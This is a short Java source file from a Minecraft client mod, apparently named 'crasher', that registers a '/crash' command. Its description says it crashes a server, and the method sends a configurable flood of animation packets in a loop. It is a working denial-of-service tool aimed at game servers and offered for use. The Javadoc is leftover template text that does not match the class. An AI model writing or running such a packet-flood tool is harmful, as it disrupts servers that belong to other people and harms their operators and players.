package org.redthsgayclub.crasher.command;

import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C0APacketAnimation;
import org.redthsgayclub.crasher.Crasher;
import cc.polyfrost.oneconfig.utils.commands.annotations.Command;
import cc.polyfrost.oneconfig.utils.commands.annotations.Main;
import org.redthsgayclub.crasher.config.PolyConfig;


/**
 * An example command implementing the Command api of OneConfig.
 * Registered in ExampleMod.java with `CommandManager.INSTANCE.registerCommand(new ExampleCommand());`
 *
 * @see Command
 * @see Main
 * @see Crasher
 */
@Command(value = "crash", description = "crash a server by sending a large number of packets in a short period of time.")
public class CrashCommand {

    @Main
    private void handle() {
        crash();
    }

    public static void crash() {
        for(int i = 0; i < PolyConfig.packets; i++) {
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
        }
    }
}